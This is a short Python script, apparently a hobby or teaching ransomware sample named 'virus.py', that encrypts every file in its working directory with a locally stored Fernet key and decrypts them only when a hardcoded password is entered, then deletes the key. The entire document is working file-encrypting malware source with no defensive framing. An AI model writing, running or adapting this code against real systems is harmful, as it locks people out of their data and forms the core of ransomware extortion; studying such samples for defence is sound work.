import os
from sys import exit
from cryptography.fernet import Fernet

# Getting all the files in the directory
files = [f for f in os.listdir() if (f != "virus.py" and f != "Secrets.key" and os.path.isfile(f))]


#Deciding if it needs to encrypt or decrypt the files
encrypted = os.path.exists("./Secrets.key")
if(not encrypted):
    secret = Fernet.generate_key()

    with open("Secrets.key", "wb") as key:
        key.write(secret)
    key.close()
else:
    password = "Carpe Somnium"
    n = input("Password: ")

    if password == n:
        print("Decrypting files...")

        with open("Secrets.key", "rb") as key:
            secret = key.read()
        key.close()
    else:
        print("Wrong password.")
        exit()

#Encryption/decryption process
for f in files:
    with open(f, "rb") as file:
        content = file.read()
    file.close()

    if(not encrypted):
        contentModified = Fernet(secret).encrypt(content)
    else:
        contentModified = Fernet(secret).decrypt(content)

    with open(f, "wb") as file:
        file.write(contentModified)
    file.close()

#Validating and removing the key directory, if it's not encrypted anymore
encrypted = not encrypted

if(not encrypted):
    os.remove("Secrets.key")
